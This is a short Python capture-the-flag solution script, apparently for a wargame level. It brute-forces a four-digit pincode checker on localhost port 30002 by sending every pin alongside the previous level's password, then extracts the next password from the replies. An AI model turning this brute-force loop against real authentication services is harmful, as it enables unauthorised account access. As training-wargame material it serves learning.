from util import *

pwd_prev = get_pass_prev().decode()

shell = open_ssh()

conn = shell.remote("localhost", 30002)
conn.recvuntil("I am the pincode checker")
conn.clean()

with log.progress("Brute forcing pin...") as p:
    for pin in range(10_000):
        if not conn.connected():
            raise EOFError

        p.status(f"{pin}")

        # it is faster to send all the attempts at once than to
        # try to recv with timeout after each attempt

        conn.sendline(f"{pwd_prev} {pin}")


# lines = conn.recvlinesS() # this throws EOF
lines = conn.clean(1).decode().split("\n")

for line in lines:
    if "Wrong! Please enter the correct current password. Try again." in line:
        raise RuntimeError(f"The password '{pwd_prev}' is incorrect")
    elif "Wrong! Please enter the correct pincode. Try again." in line:
        continue
    elif "The password of user" in line:
        pwd = line.split()[-1]
        break
    else:
        continue
else:
    raise RuntimeError("Could not find password")

write(password(), pwd)
